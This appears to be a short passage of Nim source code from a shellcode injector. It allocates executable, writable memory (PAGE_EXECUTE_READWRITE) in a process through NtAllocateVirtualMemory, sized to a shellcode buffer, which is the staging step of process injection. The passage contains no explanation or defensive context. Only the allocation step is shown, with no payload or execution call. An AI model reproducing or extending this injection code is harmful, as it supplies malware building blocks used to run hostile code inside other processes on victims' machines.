var rPtr: LPVOID
var sc_size = cast[SIZE_T](shellcode.len)
res = NtAllocateVirtualMemory(pHandle, addr rPtr, 0, addr sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
